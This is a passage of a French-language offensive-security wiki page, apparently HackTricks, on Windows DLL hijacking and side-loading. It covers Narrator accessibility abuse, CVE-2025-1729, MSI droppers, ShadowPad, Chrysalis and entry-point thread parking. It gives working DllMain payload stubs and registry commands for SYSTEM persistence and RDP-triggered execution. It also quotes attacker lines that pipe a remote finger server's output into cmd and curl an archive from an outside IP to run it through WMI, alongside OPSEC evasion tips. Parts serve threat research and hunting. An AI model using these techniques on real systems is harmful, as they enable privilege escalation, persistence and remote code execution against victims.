BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
Silence OPSEC
- Un hijack naïf fera parler/mettre en évidence l’UI. Pour rester discret, lors de l’attachement, énumérez les threads de Narrator, ouvrez le thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) et suspendez-le avec `SuspendThread` ; continuez dans votre propre thread. Consultez le PoC pour obtenir le code complet.<sup>[[8]](#references)</sup>

Déclenchement et persistence via la configuration Accessibility
- Contexte utilisateur (HKCU) : `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM) : `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Avec les éléments ci-dessus, le démarrage de Narrator charge la DLL implantée. Sur le secure desktop (écran de connexion), appuyez sur CTRL+WIN+ENTER pour démarrer Narrator ; votre DLL s’exécute en tant que SYSTEM sur le secure desktop.

Exécution SYSTEM déclenchée par RDP (mouvement latéral)
- Autoriser la couche de sécurité RDP classique : `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Connectez-vous en RDP à l’hôte, puis, sur l’écran de connexion, appuyez sur CTRL+WIN+ENTER pour lancer Narrator ; votre DLL s’exécute en tant que SYSTEM sur le secure desktop.
- L’exécution s’arrête lorsque la session RDP se ferme — injectez/migrez rapidement.

Bring Your Own Accessibility (BYOA)
- Vous pouvez cloner une entrée de registre d’un outil Accessibility (AT) intégré (par exemple, CursorIndicator), la modifier pour qu’elle pointe vers un binaire/une DLL arbitraire, l’importer, puis définir `configuration` sur le nom de cet AT. Cela permet de proxifier une exécution arbitraire sous le framework Accessibility.

Notes
- L’écriture dans `%windir%\System32` et la modification des valeurs HKLM nécessitent des droits administrateur.
- Toute la logique du payload peut résider dans `DLL_PROCESS_ATTACH` ; aucun export n’est nécessaire.

## Étude de cas : CVE-2025-1729 - Élévation de privilèges à l’aide de TPQMAssistant.exe

Ce cas présente un **Phantom DLL Hijacking** dans le TrackPoint Quick Menu de Lenovo (`TPQMAssistant.exe`), référencé sous **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Détails de la vulnérabilité

- **Composant** : `TPQMAssistant.exe`, situé dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Tâche planifiée** : `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` s’exécute chaque jour à 9 h 30 dans le contexte de l’utilisateur connecté.
- **Permissions du répertoire** : accessibles en écriture par `CREATOR OWNER`, permettant aux utilisateurs locaux de déposer des fichiers arbitraires.
- **Comportement de recherche des DLL** : tente d’abord de charger `hostfxr.dll` depuis son répertoire de travail et journalise « NAME NOT FOUND » si le fichier est absent, ce qui indique la priorité de recherche du répertoire local.

### Implémentation de l’exploit

Un attaquant peut placer un stub `hostfxr.dll` malveillant dans le même répertoire, en exploitant la DLL manquante pour obtenir l’exécution de code dans le contexte de l’utilisateur :
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Déroulement de l'attaque

1. En tant qu'utilisateur standard, déposez `hostfxr.dll` dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendez l'exécution de la tâche planifiée à 9 h 30 dans le contexte de l'utilisateur actuel.
3. Si un administrateur est connecté lorsque la tâche s'exécute, la DLL malveillante s'exécute dans la session de l'administrateur avec une intégrité moyenne.
4. Enchaînez des techniques standard de contournement de l'UAC pour passer d'une intégrité moyenne aux privilèges SYSTEM.

## Étude de cas : MSI CustomAction Dropper + DLL Side-Loading via un hôte signé (wsc_proxy.exe)

Les threat actors associent fréquemment des droppers basés sur MSI au DLL Side-Loading afin d'exécuter des payloads dans un processus de confiance et signé.<sup>[[10]](#references)</sup>

Vue d'ensemble de la chaîne
- L'utilisateur télécharge le MSI. Une CustomAction s'exécute silencieusement pendant l'installation graphique (par exemple, LaunchApplication ou une action VBScript), en reconstruisant l'étape suivante à partir de ressources intégrées.
- Le dropper écrit un EXE légitime et signé ainsi qu'une DLL malveillante dans le même répertoire (exemple de paire : wsc_proxy.exe signé par Avast + wsc.dll contrôlée par l'attaquant).
- Lorsque l'EXE signé est démarré, l'ordre de recherche des DLL de Windows charge d'abord wsc.dll depuis le répertoire de travail, exécutant le code de l'attaquant sous un parent signé (ATT&CK T1574.001).

Analyse du MSI (éléments à rechercher)
- Table CustomAction :
- Recherchez les entrées qui exécutent des fichiers exécutables ou du VBScript. Exemple de schéma suspect : LaunchApplication exécutant un fichier intégré en arrière-plan.
- Dans Orca (Microsoft Orca.exe), inspectez les tables CustomAction, InstallExecuteSequence et Binary.
- Payloads intégrés/divisés dans le CAB du MSI :
- Extraction administrative : msiexec /a package.msi /qb TARGETDIR=C:\out
- Ou utilisez lessmsi : lessmsi x package.msi C:\out
- Recherchez plusieurs petits fragments qui sont concaténés et déchiffrés par une CustomAction VBScript. Flux courant :
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading pratique avec wsc_proxy.exe
- Déposez ces deux fichiers dans le même dossier :
- wsc_proxy.exe : hôte légitime signé (Avast). Le processus tente de charger wsc.dll par son nom depuis son répertoire.
- wsc.dll : DLL de l’attaquant. Si aucun export spécifique n’est requis, DllMain peut suffire ; sinon, créez une DLL proxy et transférez les exports requis vers la bibliothèque légitime tout en exécutant le payload dans DllMain.
- Créez un payload DLL minimal :
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Pour les exigences d’export, utilisez un framework de proxying (par ex. DLLirant/Spartacus) afin de générer une DLL de forwarding qui exécute également votre payload.

- Cette technique repose sur la résolution du nom de DLL par le binaire hôte. Si l’hôte utilise des chemins absolus ou des indicateurs de chargement sécurisé (par ex. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), le hijack peut échouer.
- KnownDLLs, SxS et les exports forwardés peuvent influencer la priorité et doivent être pris en compte lors de la sélection du binaire hôte et de l’ensemble d’exports.

## Triades signées + payloads chiffrés (étude de cas ShadowPad)

Check Point a décrit comment Ink Dragon déploie ShadowPad à l’aide d’une **triade de trois fichiers**, afin de se fondre dans des logiciels légitimes tout en conservant le payload principal chiffré sur le disque :<sup>[[12]](#references)</sup>

1. **EXE hôte signé** – des fournisseurs tels qu’AMD, Realtek ou NVIDIA sont détournés (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Les attaquants renomment l’exécutable pour lui donner l’apparence d’un binaire Windows (par exemple `conhost.exe`), mais la signature Authenticode reste valide.
2. **DLL loader malveillante** – déposée à côté de l’EXE avec un nom attendu (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL est généralement un binaire MFC obfusqué avec le framework ScatterBrain ; son seul rôle est de localiser le blob chiffré, de le déchiffrer et de mapper ShadowPad de manière reflective.
3. **Blob de payload chiffré** – souvent stocké sous la forme `<name>.tmp` dans le même répertoire. Après le memory-mapping du payload déchiffré, le loader supprime le fichier TMP afin de détruire les preuves forensiques.

Notes de tradecraft :

* Renommer l’EXE signé (tout en conservant le `OriginalFileName` d’origine dans l’en-tête PE) lui permet de se faire passer pour un binaire Windows tout en conservant la signature du fournisseur. Reproduisez donc l’habitude d’Ink Dragon de déposer des binaires ressemblant à `conhost.exe`, mais qui sont en réalité des utilitaires AMD/NVIDIA.
* Comme l’exécutable reste approuvé, la plupart des contrôles d’allowlisting doivent seulement permettre à votre DLL malveillante de se trouver à côté de celui-ci. Concentrez-vous sur la personnalisation de la DLL loader ; le parent signé peut généralement être exécuté sans modification.
* Le decryptor de ShadowPad s’attend à ce que le blob TMP se trouve à côté du loader et soit accessible en écriture afin de pouvoir mettre le fichier à zéro après le mapping. Conservez le répertoire accessible en écriture jusqu’au chargement du payload ; une fois celui-ci en mémoire, le fichier TMP peut être supprimé sans risque pour l’OPSEC.

### Stager LOLBAS + chaîne de sideloading d’archive staged (finger → tar/curl → WMI)

Les opérateurs associent le DLL sideloading à LOLBAS afin que le seul artefact personnalisé sur le disque soit la DLL malveillante placée à côté de l’EXE approuvé :<sup>[[1]](#references)</sup>

- **Remote command loader (Finger) :** PowerShell masqué lance `cmd.exe /c`, récupère les commandes depuis un serveur Finger et les transmet à `cmd` :

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` récupère du texte via TCP/79 ; `| cmd` exécute la réponse du serveur, ce qui permet aux opérateurs de faire pivoter le serveur de second stage côté serveur.

- **Téléchargement/extraction intégrés :** téléchargez une archive avec une extension bénigne, décompressez-la et stagez la cible du sideloading ainsi que la DLL dans un dossier `%LocalAppData%` aléatoire :

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` masque la progression et suit les redirections ; `tar -xf` utilise le tar intégré à Windows.

- **Lancement WMI/CIM :** démarrez l’EXE via WMI afin que la télémétrie affiche un processus créé par CIM pendant qu’il charge la DLL placée à ses côtés :

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Fonctionne avec les binaires qui privilégient les DLL locales (par ex. `intelbq.exe`, `nearby_share.exe`) ; le payload (par ex. Remcos) s’exécute sous le nom approuvé.

- **Hunting :** déclenchez une alerte sur `forfiles` lorsque `/p`, `/m` et `/c` apparaissent ensemble ; cette combinaison est peu courante en dehors des scripts d’administration.


## Étude de cas : dropper NSIS + sideloading de Bitdefender Submission Wizard (Chrysalis)

Une intrusion récente de Lotus Blossom a détourné une chaîne de mise à jour approuvée afin de fournir un dropper packé avec NSIS, qui mettait en place un DLL sideloading ainsi que des payloads entièrement exécutés en mémoire.<sup>[[13]](#references)</sup>

Flux de tradecraft
- `update.exe` (NSIS) crée `%AppData%\Bluetooth`, le marque comme **HIDDEN**, dépose un Bitdefender Submission Wizard renommé `BluetoothService.exe`, une `log.dll` malveillante et un blob chiffré `BluetoothService`, puis lance l’EXE.
- L’EXE hôte importe `log.dll` et appelle `LogInit`/`LogWrite`. `LogInit` charge le blob par mmap ; `LogWrite` le déchiffre avec un flux basé sur un LCG personnalisé (constantes **0x19660D** / **0x3C6EF35F**, éléments de clé dérivés d’un hash précédent), écrase le buffer avec le shellcode en clair, libère les éléments temporaires et y saute.
- Pour éviter une IAT, le loader résout les API en hashant les noms d’exports à l’aide de **FNV-1a basis 0x811C9DC5 + prime 0x100019**, puis en appliquant un avalanche de style Murmur (**0x85EBCA6B**) et en comparant les résultats aux hashes cibles salés.

Shellcode principal (Chrysalis)
- Déchiffre un module principal similaire à un PE en répétant des opérations d’addition/XOR/soustraction avec la clé `gQ2JR&9;` sur cinq passes, puis charge dynamiquement `Kernel32.dll` → `GetProcAddress` pour terminer la résolution des imports.
- Reconstruit les chaînes de noms de DLL à l’exécution au moyen de transformations rotate/XOR par caractère, puis charge `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Utilise un second resolver qui parcourt le **PEB → InMemoryOrderModuleList**, analyse chaque table d’exports par blocs de 4 octets avec un mélange de style Murmur et n’utilise `GetProcAddress` qu’en solution de repli si le hash est introuvable.

Configuration intégrée et C2
- La configuration se trouve dans le fichier `BluetoothService` déposé à **l’offset 0x30808** (taille **0x980**) et est déchiffrée avec RC4 à l’aide de la clé `qwhvb^435h&*7`, révélant l’URL du C2 et le User-Agent.
- Les beacons construisent un profil d’hôte délimité par des points, lui préfixent le tag `4Q`, puis le chiffrent avec RC4 à l’aide de la clé `vAuig34%^325hGV` avant `HttpSendRequestA` sur HTTPS. Les réponses sont déchiffrées avec RC4 et distribuées par un tag switch (`4T` shell, `4V` exécution de processus, `4W/4X` écriture de fichier, `4Y` lecture/exfiltration, `4\\` désinstallation, `4` énumération des disques/fichiers + cas de transfert par morceaux).
- Le mode d’exécution est contrôlé par les arguments CLI : sans argument = installation de la persistence (service/clé Run) pointant vers `-i` ; `-i` relance le processus avec `-k` ; `-k` ignore l’installation et exécute le payload.

Loader alternatif observé
- La même intrusion a déposé Tiny C Compiler et exécuté `svchost.exe -nostdlib -run conf.c` depuis `C:\ProgramData\USOShared\`, avec `libtcc.dll` à ses côtés. Le code source C fourni par l’attaquant intégrait le shellcode, le compilait et l’exécutait en mémoire sans écrire de PE sur le disque. Reproduisez avec :
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Cette étape de compilation et d’exécution basée sur TCC importait `Wininet.dll` à l’exécution et récupérait un shellcode de seconde étape depuis une URL codée en dur, fournissant un loader flexible qui se faisait passer pour une exécution de compilateur.

## Signed-host sideloading with export proxying + host thread parking

Certaines chaînes de DLL sideloading ajoutent une **stability engineering** afin que l’hôte légitime reste actif suffisamment longtemps pour charger proprement les étapes ultérieures, au lieu de planter après le chargement de la DLL malveillante.<sup>[[11]](#references)</sup>

Pattern observé
- Déposer un EXE de confiance à côté d’une DLL malveillante en utilisant le nom de dépendance attendu, tel que `version.dll`.
- La DLL malveillante **proxies every expected export** vers la véritable DLL système, par exemple `%SystemRoot%\\System32\\version.dll`, afin que la résolution des imports réussisse toujours et que le processus hôte continue de fonctionner.
- Après le chargement, la DLL malveillante **patches the host entry point** afin que le thread principal tombe dans une boucle infinie `Sleep` au lieu de se terminer ou d’exécuter des chemins de code qui mettraient fin au processus.
- Un nouveau thread effectue le véritable travail malveillant : déchiffrer le nom ou le chemin de la DLL de l’étape suivante (`RC4`/`XOR` sont courants), puis la lancer avec `LoadLibrary`.

Pourquoi c’est important
- Le proxying normal de DLL préserve la compatibilité de l’API, mais ne garantit pas que l’hôte restera actif assez longtemps pour les étapes ultérieures.
- Le fait de maintenir le thread principal dans `Sleep(INFINITE)` est un moyen simple de garder le processus signé résident pendant que le loader effectue le déchiffrement, le staging ou l’initialisation réseau dans un worker thread.
- Une hunting limitée à un `DllMain` suspect peut manquer ce pattern si le comportement intéressant se produit après le patch du point d’entrée de l’hôte et le démarrage d’un thread secondaire.

Workflow minimal
1. Copier l’EXE hôte signé et déterminer la DLL qu’il résout depuis le répertoire local.
2. Construire une DLL proxy exportant les mêmes fonctions et les redirigeant vers la DLL légitime.
3. Dans `DllMain(DLL_PROCESS_ATTACH)`, créer un worker thread.
4. Depuis ce thread, patcher le point d’entrée de l’hôte ou la routine de démarrage du thread principal afin qu’il boucle sur `Sleep`.
5. Déchiffrer le nom/la configuration de la DLL de l’étape suivante et appeler `LoadLibrary` ou effectuer un manual-map du payload.

Pivots défensifs
- Processus signés chargeant `version.dll` ou des bibliothèques courantes similaires depuis leur propre répertoire d’application au lieu de `System32`.
- Patches mémoire au niveau du point d’entrée du processus peu après le chargement de l’image, notamment les sauts/appels redirigés vers `Sleep`/`SleepEx`.
- Threads créés par une DLL proxy qui appellent immédiatement `LoadLibrary` sur une seconde DLL dont le nom a été déchiffré.
- DLL proxy complètes exportant toutes les fonctions, placées à côté d’exécutables de fournisseurs dans des répertoires de staging accessibles en écriture tels que `ProgramData`, `%TEMP%` ou des chemins d’archives décompressées.

## References

- [1] [Red Canary – Analyses de renseignement : janvier 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Élévation de privilèges à l’aide de TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT : DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking dans Windows. Exemple simple en C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore déploie un nouveau malware ciblant l’Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility : quand les DLL Hijacks rencontrent les assistants Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Doppelgängers numériques : anatomie des campagnes d’usurpation en évolution distribuant Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Convergence des intérêts : analyse des clusters de menaces ciblant un gouvernement d’Asie du Sud-Est](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – À l’intérieur d’Ink Dragon : révélation du réseau de relais et du fonctionnement interne d’une opération offensive furtive](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – La backdoor Chrysalis : analyse approfondie de la boîte à outils de Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → chaîne de DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Suivi des campagnes d’espionnage 2026 de l’APT iranien Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – élément `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – élément `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – élément `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – élément `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – élément `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – élément `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Rapide et furieux : opérations de Nimbus Manticore pendant le conflit iranien](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Actions de tâches](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 cible les gouvernements et les infrastructures critiques d’Asie du Sud-Est](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
